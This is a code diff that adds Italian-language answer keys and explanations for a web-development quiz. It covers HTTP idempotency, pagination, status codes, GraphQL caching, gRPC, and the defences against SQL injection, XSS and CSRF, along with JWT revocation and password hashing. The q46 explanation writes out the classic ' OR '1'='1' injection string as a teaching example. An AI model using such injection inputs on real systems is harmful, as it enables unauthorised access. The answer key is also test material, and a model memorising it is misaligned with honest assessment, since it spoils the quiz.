+                correctText: '✅ Corretto! POST non è idempotente per design: ogni richiesta crea una nuova risorsa. Senza idempotency key, il server non ha modo di sapere che la seconda richiesta è un retry, quindi crea due ordini. Per questo si usa X-Idempotency-Key: il client genera un ID unico, e il server lo usa per riconoscere i retry e ritornare il risultato cached invece di processare di nuovo.',
+                incorrectText: {
+                    a: '❌ Sbagliato. Il server non può rilevare automaticamente i duplicati senza un meccanismo esplicito (idempotency key). Due richieste identiche sono indistinguibili.',
+                    c: '❌ Sbagliato. 409 Conflict si usa per violazioni di constraint (es. email già esistente), non per retry detection. Senza idempotency key, non c\'è conflitto - sono due creazioni valide.',
+                    d: '❌ Sbagliato. HTTP non garantisce at-most-once. Il protocollo è stateless - ogni richiesta è indipendente. La semantica di delivery dipende dall\'applicazione.'
+                }
+            },
+            q42: {
+                correct: 'c',
+                correctText: '✅ Corretto! Per feed social (timeline), cursor-based pagination è ideale perché: 1) I dati cambiano frequentemente (nuovi post) - offset causerebbe duplicati o post mancanti. 2) Non serve "vai a pagina 57" - lo scroll è sempre sequenziale. 3) Performance: il cursor (tipicamente timestamp + ID) usa indici efficientemente, mentre OFFSET 10000 deve scorrere 10000 righe.',
+                incorrectText: {
+                    a: '❌ Sbagliato. Offset-based ha problemi con dati in movimento: se un nuovo post viene aggiunto mentre scrolli, vedrai duplicati o salterai post.',
+                    b: '❌ Sbagliato. Un feed social può avere milioni di post. Caricare tutto è impossibile per memoria e bandwidth. La pagination è obbligatoria.',
+                    d: '❌ Sbagliato. Un feed deve essere ordinato cronologicamente (o per relevance). Random sampling renderebbe l\'UX caotica e inutilizzabile.'
+                }
+            },
+            q43: {
+                correct: 'a',
+                correctText: '✅ Corretto! 403 Forbidden: l\'utente È autenticato (sappiamo chi è) ma NON È autorizzato ad accedere a quella specifica risorsa. 401 Unauthorized significa "non autenticato" (nome fuorviante nello standard HTTP). La distinzione è importante per il client: 401 → mostra login, 403 → mostra "accesso negato".',
+                incorrectText: {
+                    b: '❌ Sbagliato. 401 Unauthorized si usa quando l\'utente NON è autenticato (token mancante/invalido). Qui l\'utente è autenticato, ma non ha i permessi.',
+                    c: '❌ Sbagliato. 404 indica che la risorsa non esiste. Usarlo per nascondere l\'esistenza può avere senso per sicurezza (security through obscurity), ma non è semanticamente corretto.',
+                    d: '❌ Sbagliato. 400 Bad Request indica problemi con la richiesta stessa (JSON malformato, validation error). L\'autorizzazione non è un problema di formato richiesta.'
+                }
+            },
+            q44: {
+                correct: 'd',
+                correctText: '✅ Corretto! HTTP cache usa l\'URL come cache key. In REST, GET /users/123 e GET /users/456 sono URL diverse → cache separate. In GraphQL, TUTTE le query vanno a POST /graphql con query nel body. Stesso URL per query diverse = impossibile cachare a livello HTTP/CDN. Soluzioni: persisted queries (hash → query), GET con query param, o caching application-level.',
+                incorrectText: {
+                    a: '❌ Sbagliato. GraphQL usa JSON, non formato binario. Il formato non è il problema del caching.',
+                    b: '❌ Sbagliato. Le response possono essere deterministiche. Il problema è che l\'HTTP cache non sa distinguere query diverse perché vanno tutte allo stesso endpoint.',
+                    c: '❌ Sbagliato. GraphQL supporta tutti gli HTTP headers. Il problema è il metodo (POST) e l\'endpoint unico, non gli headers.'
+                }
+            },
+            q45: {
+                correct: 'b',
+                correctText: '✅ Corretto! Per comunicazione interna ad alta frequenza, gRPC eccelle: 1) Protocol Buffers sono 3-10x più piccoli di JSON. 2) HTTP/2 multiplexing: una connessione, molte richieste parallele senza head-of-line blocking. 3) Code generation: client/server strongly typed, meno errori. 4) Streaming nativo per scenari real-time. REST è più semplice ma meno efficiente; GraphQL è per frontend flexibility, non performance backend.',
+                incorrectText: {
+                    a: '❌ Sbagliato. Per servizi interni, la facilità di debug con curl è meno importante della performance. gRPC ha tools (grpcurl, Evans) e observability ottima.',
+                    c: '❌ Sbagliato. GraphQL risolve problemi di frontend (over/under-fetching). Tra microservizi, le interfacce sono definite chiaramente - la flessibilità GraphQL aggiunge overhead senza beneficio.',
+                    d: '❌ Sbagliato. WebSocket è per comunicazione bidirezionale push-based (chat, notifiche). Per request-response ad alta frequenza, gRPC con HTTP/2 è più appropriato e strutturato.'
+                }
+            },
+            // Modulo 10: Security
+            q46: {
+                correct: 'c',
+                correctText: '✅ Corretto! La query diventa: SELECT * FROM users WHERE id = \'1\' OR \'1\'=\'1\'. Poiché \'1\'=\'1\' è sempre vero, la condizione WHERE è sempre vera per OGNI riga. Risultato: ritorna TUTTI gli utenti. Questo è un classico bypass di autenticazione. Con prepared statements, l\'input verrebbe trattato come stringa letterale, non come codice SQL.',
+                incorrectText: {
+                    a: '❌ Sbagliato. La query è sintatticamente valida. Gli apici sono bilanciati e l\'OR è SQL valido.',
+                    b: '❌ Sbagliato. Il database non cerca un ID con quel valore letterale. Interpreta l\'input come codice SQL, aggiungendo una condizione OR sempre vera.',
+                    d: '❌ Sbagliato. I database non hanno protezione automatica contro SQL injection. È responsabilità dell\'applicazione usare prepared statements.'
+                }
+            },
+            q47: {
+                correct: 'b',
+                correctText: '✅ Corretto! JWT per design sono stateless - il server non tiene traccia dei token emessi. Per revocare un token specifico, devi implementare una blacklist (in Redis o DB) dei token revocati. Ad ogni richiesta, oltre a verificare la firma, controlli se il token è in blacklist. Trade-off: perdi parte della "statelessness", ma è l\'unico modo per revoca immediata.',
+                incorrectText: {
+                    a: '❌ Sbagliato. Cambiare la secret key invalida TUTTI i token, non solo quello rubato. Tutti gli utenti dovrebbero riautenticarsi.',
+                    c: '❌ Sbagliato. Aspettare la scadenza può significare ore o giorni di accesso non autorizzato. Inaccettabile per security.',
+                    d: '❌ Sbagliato. La firma garantisce che il token non sia stato MODIFICATO, non che non sia stato COPIATO. Se l\'attacker ha il token, può usarlo.'
+                }
+            },
+            q48: {
+                correct: 'a',
+                correctText: '✅ Corretto! La difesa principale contro XSS è l\'output encoding: quando renderizzi la bio, escape i caratteri speciali HTML (<, >, &, \", \') in entità HTML (&lt;, &gt;, etc.). Così <script> diventa &lt;script&gt; e il browser lo mostra come testo, non lo esegue. Input validation è un layer aggiuntivo, ma l\'output encoding è la difesa primaria.',
+                incorrectText: {
+                    b: '❌ Sbagliato. Rifiutare caratteri speciali è troppo restrittivo (gli utenti vogliono usare <3, "citazioni", etc.) e non è la difesa giusta. L\'output encoding permette qualsiasi input ma lo rende sicuro.',
+                    c: '❌ Sbagliato. HTTPS cifra il trasporto ma non previene XSS. Lo script malevolo arriva comunque al browser, solo cifrato durante il trasporto.',
+                    d: '❌ Sbagliato. Rate limiting previene brute force e DoS, non XSS. L\'attacker deve inserire lo script una volta sola.'
+                }
+            },
+            q49: {
+                correct: 'd',
+                correctText: '✅ Corretto! CSRF funziona perché i browser inviano automaticamente i cookie con ogni richiesta allo stesso dominio. L\'attacker può far fare al browser della vittima una richiesta a bank.com, e i cookie vengono inclusi automaticamente. Ma Authorization header NON è automatico: il JavaScript deve esplicitamente aggiungerlo. Un sito malevolo non può aggiungere header a richieste cross-origin (CORS lo impedisce).',
+                incorrectText: {
+                    a: '❌ Sbagliato. CSRF non è sempre necessario. È necessario quando usi cookie per l\'autenticazione. Con token in header, CSRF non è un rischio.',
+                    b: '❌ Sbagliato. CSRF non ruba token - fa eseguire azioni usando i cookie della vittima. JWT in header non è vulnerabile a CSRF (ma può essere vulnerabile a XSS se in localStorage).',
+                    c: '❌ Sbagliato. Anche da browser, se usi Authorization header invece di cookie, CSRF non è un rischio. Il browser non aggiunge automaticamente l\'header.'
+                }
+            },
+            q50: {
+                correct: 'c',
+                correctText: '✅ Corretto! BCrypt, Argon2, e scrypt sono algoritmi di "adaptive hashing" progettati per password. Sono intenzionalmente LENTI (work factor configurabile) per rendere il brute force impraticabile. Includono salt automatico. SHA-256 è troppo veloce (miliardi di tentativi/secondo con GPU). MD5 è completamente broken. AES è per encryption (reversibile), non hashing (one-way).',
+                incorrectText: {
+                    a: '❌ Sbagliato. SHA-256 è troppo veloce per password hashing. Con hardware moderno, un attacker può provare miliardi di combinazioni al secondo. È ok per checksum, non per password.',
+                    b: '❌ Sbagliato. MD5 è completamente broken - collision attacks pratici, rainbow tables disponibili. MAI usare MD5 per nulla di security-related.',
+                    d: '❌ Sbagliato. AES è encryption simmetrica: reversibile con la chiave. Per le password serve hashing one-way: non devi MAI poter recuperare la password originale.'
                 }
             }
         };
